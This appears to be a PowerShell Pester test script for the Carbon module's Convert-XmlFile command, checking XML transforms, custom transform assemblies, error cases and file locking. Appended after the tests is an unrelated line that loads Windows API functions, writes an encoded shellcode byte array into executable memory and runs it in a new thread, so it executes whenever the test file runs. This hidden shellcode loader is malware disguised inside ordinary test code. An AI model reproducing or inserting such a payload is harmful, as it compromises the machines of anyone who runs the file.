











$tempDir = $null
$xmlFilePath = $null
$xdtFilePath = $null
$resultFilePath = $null

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

function Assert-XmlTransformed
{
    $resultFilePath | Should -Exist
    	
    
    $newContext = Get-Content $resultFilePath
    ($newContext -match '<add name="MyDB" connectionString="some value"/>') | Should -Be $true
}
    
Describe 'Convert-XmlFile' {
    BeforeEach {
        $xmlFilePath = Join-Path -Path $TestDrive.FullName -ChildPath 'in.xml'
        $xdtFilePath = Join-Path -Path $TestDrive.FullName -ChildPath 'xdt.xml'
        $resultFilePath = Join-Path -Path $TestDrive.FullName -ChildPath 'out.xml'
        Get-ChildItem -Path $TestDrive.FullName | Remove-Item 
    }
    
    function Set-XmlFile
    {
    	@'
<?xml version="1.0"?>
<configuration>
    <connectionStrings>
    </connectionStrings>
</configuration>
'@ > $xmlFilePath
    }
    
    function Set-XdtFile
    {
    	@'
<?xml version="1.0"?>
<configuration xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">
    <connectionStrings>
    	<add name="MyDB" connectionString="some value" xdt:Transform="Insert" />
    </connectionStrings>
</configuration>
'@ > $xdtFilePath
    }
    
    It 'should convert xml file using files as inputs' {
        Set-XmlFile	
        Set-XdtFile	
    	
    	
    	Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath
    
        Assert-XmlTransformed
    }
    
    It 'should allow users to load custom transforms' {
        $carbonTestXdtBinPath = Join-Path -Path $PSScriptRoot -ChildPath '..\Source\Test\Xdt\bin' -Resolve
        $carbonTestAssemblyPath = Join-Path -Path $carbonTestXdtBinPath -ChildPath 'net452' -Resolve

        $IsPSCore = $PSVersionTable['PSEdition'] -eq 'Core'
        if( $IsPSCore )
        {
            $carbonTestAssemblyPath = Join-Path -Path $carbonTestXdtBinPath -ChildPath 'netstandard2.0' -Resolve
        }

        $carbonTestAssemblyPath = Join-Path -Path $carbonTestAssemblyPath -ChildPath 'Carbon.Test.Xdt.dll' -Resolve
    
    	@'
<?xml version="1.0"?>
<configuration>
    <connectionStrings>
        <add name="PreexistingDB" />
    </connectionStrings>
    
    <one>
        <two>
            <two.two />
        </two>
        <three />
    </one>
</configuration>
'@ > $xmlFilePath
    	
    	@'
<?xml version="1.0"?>
<configuration xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">
    <xdt:Import path="{0}" namespace="Carbon.Test.Xdt"/>
    	
    <connectionStrings xdt:Transform="Merge" >
    	<add name="MyDB" connectionString="some value" xdt:Transform="Insert" />
    </connectionStrings>
    	
    <one xdt:Transform="Merge">
    	<two xdt:Transform="Merge">
    	</two>
    </one>
    	
</configuration>
'@ -f $carbonTestAssemblyPath > $xdtFilePath
    	
    	
    	Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath -TransformAssemblyPath @( $carbonTestAssemblyPath )
    	
    	
    	$newContext = (Get-Content $resultFilePath) -join "`n"
    	
    	($newContext -match '<add name="MyDB" connectionString="some value"/>') | Should -Be $true
    	($newContext -match '<add name="PreexistingDB" />') | Should -Be $true
    	($newContext -match '<two\.two ?/>') | Should -Be $true
    	($newContext -match '<three ?/>') | Should -Be $true
    }
    
    It 'should allow raw xdt xml' {
        Set-XmlFile
    	
    	$xdt = @'
<?xml version="1.0"?>
<configuration xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">
    <connectionStrings>
    	<add name="MyDB" connectionString="some value" xdt:Transform="Insert" />
    </connectionStrings>
</configuration>
'@ 
    	
    	
    	Convert-XmlFile -Path $xmlFilePath -XdtXml $xdt -Destination $resultFilePath
    
        (Get-ChildItem -Path $env:TEMP -Filter 'Carbon_Convert-XmlFile-*') | Should -BeNullOrEmpty
    	
    	
        Assert-XmlTransformed
    }
    
    It 'should give an error if transforming in place' {
        $error.Clear()
        $null = New-Item -Path $xmlFilePath,$xdtFilePath -ItemType File
        $resultFilePath | Should -Not -Exist
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $xmlFilePath -ErrorAction SilentlyContinue
        $error.Count | Should -Be 1
        ($error[0].ErrorDetails.Message -like '*Path is the same as Destination*') | Should -BeTrue
        $resultFilePath | Should -Not -Exist
    }
    
    It 'should not lock files' {
        Set-XmlFile
        Set-XdtFile
    
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath
    
        Assert-XmlTransformed
    
        $error.Clear()
    
        '' > $xmlFilePath
        '' > $xdtFilePath
        '' > $resultFilePath
    
        $error.Count | Should -Be 0
        (Get-Content -Path $xmlFilePath) | Should -Be ''
        (Get-Content -Path $xdtFilePath) | Should -Be ''
        (Get-Content -Path $resultFilePath) | Should -Be ''
    
    }
    
    It 'should support should process' {
        Set-XmlFile
        Set-XdtFile
    
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath -WhatIf
    
        $resultFilePath | Should -Not -Exist
    }
    
    It 'should fail if destination exists' {
        Set-XmlFile
        Set-XdtFile
        '' > $resultFilePath
    
        $error.Clear()
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath -ErrorAction SilentlyContinue
    
        $error.Count | Should -Be 1
        ($error[0].ErrorDetails.Message -like '*Destination ''*'' exists*') | Should -BeTrue
        (Get-Content -Path $resultFilePath) | Should -Be ''
    }
    
    It 'should overwrite destination' {
        Set-XmlFile
        Set-XdtFile
        '' > $resultFilePath
    
        $error.Clear()
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath -Force
    
        $error.Count | Should -Be 0
        Assert-XmlTransformed
    }
    
    It 'should fail if transform assembly path not found' {
        Set-XmlFile
        Set-XdtFile
        
        $error.Clear()
        Convert-XmlFile -Path $xmlFilePath -XdtPath $xdtFilePath -Destination $resultFilePath -TransformAssemblyPath 'C:\I\Do\Not\Exist' -ErrorAction SilentlyContinue
        $resultFilePath | Should -Not -Exist
        $error.Count | Should -Be 1
        $error[0].Exception.Message | Should -BeLike '*not found*'
    }
    
}

$uit8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $uit8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x0b,0x9b,0x9e,0xfe,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x04,0x79,0x6b,0x02,0xf2,0xff,0x94,0xfb,0x02,0x60,0x1c,0x1e,0x33,0xa0,0x7a,0x6a,0x63,0x10,0x08,0x3e,0x8f,0xdb,0x5c,0xab,0x04,0xa9,0x48,0xdc,0xad,0x04,0xaf,0xd3,0x2e,0x34,0x93,0x72,0xac,0x47,0xc0,0x54,0x8d,0x87,0x15,0x94,0xca,0xfa,0xd4,0xc4,0x83,0x71,0x4a,0xf9,0xa0,0xcc,0x57,0x72,0xfa,0xc1,0xdf,0x67,0x4a,0xe3,0xce,0x39,0xc1,0xba,0xd0,0xb8,0x06,0xb7,0x58,0xa3,0x4b,0xf2,0x13,0x58,0xbf,0x88,0xa5,0x88,0x8e,0x71,0x09,0xf5,0x3f,0x80,0x53,0x31,0x87,0x7b,0x26,0x4b,0xf4,0x06,0x31,0x88,0x87,0xdc,0xb4,0x0b,0x2f,0x96,0x6f,0xf0,0xce,0x7b,0xe9,0x73,0xdc,0x30,0x7d,0xdb,0xc0,0xc7,0x52,0x57,0xfc,0x4c,0x55,0xb8,0x75,0x16,0x72,0x1c,0xde,0xcc,0x1b,0x05,0xba,0xa3,0x24,0x55,0x65,0x1b,0x81,0x1d,0x8b,0x48,0xb8,0x7f,0xc3,0xbd,0xf1,0x7f,0x13,0xaa,0x82,0x0c,0x21,0x75,0x39,0x9b,0x09,0xfe,0xe7,0x5c,0x6e,0xd5,0x50,0xf2,0x91,0xd6,0xa0,0xda,0x55,0x82,0xf0,0x74,0x7c,0xab,0x9a,0x84,0x81,0x7e,0x36,0x80,0x15,0x41,0x6f,0x8b,0xe2,0x29,0x72,0x8c,0xfd,0xf5,0xfb,0x6a,0xad,0x55,0xac,0x22,0x0d,0x06,0x0c,0x93,0xe5,0x4c,0x83,0xcc,0x15,0x6f,0x49,0x65,0xbf,0x80,0x24,0xdd,0x57,0x38,0x6d,0x95,0xc6,0xc5,0xbb,0xd3,0xc8,0x4e,0x48,0x23,0x86,0xa6,0x25,0x37,0x7e,0x47,0x70,0x65,0x28,0x58,0xae,0x00,0xd4,0xcc,0x55,0x83,0x83,0x78,0x54,0xf2,0xe3,0x26,0xa7,0xd1,0x78,0xee,0x3d,0x9a,0x16,0x0f,0xd2,0x1a,0xe6,0x59,0xb8,0x1a,0x8e,0x3d,0x98,0x48,0xab,0x41,0x35,0xfd,0x60,0xd4,0xb6,0x54,0xd5,0x7f,0xdf,0x5a,0x00,0xb7,0x40,0xa4,0x67,0x49,0xbc,0x73,0x41,0x3f,0xac,0x47;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Osz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Osz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Osz,0,0,0);for (;;){Start-sleep 60};

